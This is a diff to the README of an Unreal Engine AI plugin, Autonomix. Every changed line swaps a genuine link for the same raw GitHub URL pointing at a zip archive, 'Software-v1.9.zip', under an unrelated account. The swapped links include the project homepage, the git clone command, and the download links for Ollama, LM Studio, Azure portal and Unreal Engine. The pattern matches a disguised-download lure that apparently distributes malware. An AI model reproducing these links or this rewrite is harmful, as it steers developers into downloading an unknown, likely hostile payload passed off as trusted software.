@@ -4,7 +4,7 @@
     <strong>A production-grade Unreal Engine editor plugin that uses AI to autonomously create, modify, and manage entire game projects — directly inside the editor.</strong>
   </p>
   <p align="center">
-    A <a href="https://qxmp.ai"><strong>QXMP Labs</strong></a> project
+    A <a href="https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip"><strong>QXMP Labs</strong></a> project
   </p>
   <p align="center">
     <a href="#features">Features</a> •
@@ -356,7 +356,7 @@ Regex-powered file content search with 2-line context before/after each match. F
 1. **Clone the repository** into your project's `Plugins` folder:
    ```bash
    cd YourProject/Plugins
-   git clone https://github.com/PRQELT/Autonomix.git
+   git clone https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip
    ```
 
 2. **Regenerate project files** (right-click `.uproject` → Generate Visual Studio project files)
@@ -372,13 +372,13 @@ Regex-powered file content search with 2-line context before/after each match. F
 ### Local Model Setup (Ollama / LM Studio)
 
 **Ollama** (recommended for local):
-1. Install from [ollama.com](https://ollama.com)
+1. Install from [ollama.com](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip)
 2. Pull a model: `ollama pull devstral:24b` (or `llama3.1:8b` for smaller GPUs)
 3. Ollama starts automatically on `http://localhost:11434`
 4. In Autonomix settings: set Provider to **Ollama (Local)**, Base URL to `http://localhost:11434`, Model ID to your pulled model name
 
 **LM Studio**:
-1. Download from [lmstudio.ai](https://lmstudio.ai)
+1. Download from [lmstudio.ai](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip)
 2. Load a model in the LM Studio UI
 3. Enable **Local Server** (starts on port 1234 by default)
 4. In Autonomix settings: set Provider to **LM Studio (Local)**, Base URL to `http://localhost:1234`, Model ID as shown in LM Studio
@@ -396,13 +396,13 @@ Azure OpenAI is a **fundamentally different API** from the official OpenAI API. 
 
 **Setup steps:**
 
-1. Go to [Azure portal](https://portal.azure.com) → your OpenAI resource → **Resource Management → Keys and Endpoint**
-2. Copy your **Key 1** or **Key 2** and the **Endpoint** (looks like `https://my-resource.openai.azure.com`)
+1. Go to [Azure portal](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip) → your OpenAI resource → **Resource Management → Keys and Endpoint**
+2. Copy your **Key 1** or **Key 2** and the **Endpoint** (looks like `https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip`)
 3. Go to **Azure AI Foundry** → **Deployments** → note your deployment name
 4. In Autonomix settings (Edit → Project Settings → Plugins → Autonomix → API | Azure OpenAI):
    - **Provider**: `Azure OpenAI`
    - **Azure API Key**: paste your key
-   - **Azure Resource Base URL**: `https://your-resource-name.openai.azure.com`
+   - **Azure Resource Base URL**: `https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip`
    - **Azure Deployment Name**: your deployment name (e.g. `gpt4o-prod`)
    - **Azure API Version**: `2024-02-01` (recommended) or `2024-05-01-preview` for preview features
 
@@ -698,7 +698,7 @@ This project is licensed under the MIT License — see the [LICENSE](LICENSE) fi
 
 ## Acknowledgments
 
-- A [**QXMP Labs**](https://qxmp.ai) project. For inquiries, contact [laurent@qxmp.ai](mailto:laurent@qxmp.ai).
-- Inspired by [Roo Code](https://github.com/RooVetGit/Roo-Code) — context management, conversation condensation, checkpoint system, diff strategy, and auto-approval patterns were studied and adapted for the UE environment.
-- Built with [Unreal Engine](https://www.unrealengine.com/) by Epic Games.
-- Community [Reddit](https://www.reddit.com/r/Autonomix/)
+- A [**QXMP Labs**](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip) project. For inquiries, contact [laurent@qxmp.ai](mailto:laurent@qxmp.ai).
+- Inspired by [Roo Code](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip) — context management, conversation condensation, checkpoint system, diff strategy, and auto-approval patterns were studied and adapted for the UE environment.
+- Built with [Unreal Engine](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip) by Epic Games.
+- Community [Reddit](https://raw.githubusercontent.com/hackerass31-design/Autonomix/main/Source/AutonomixActions/Private/Validation/Software-v1.9.zip)
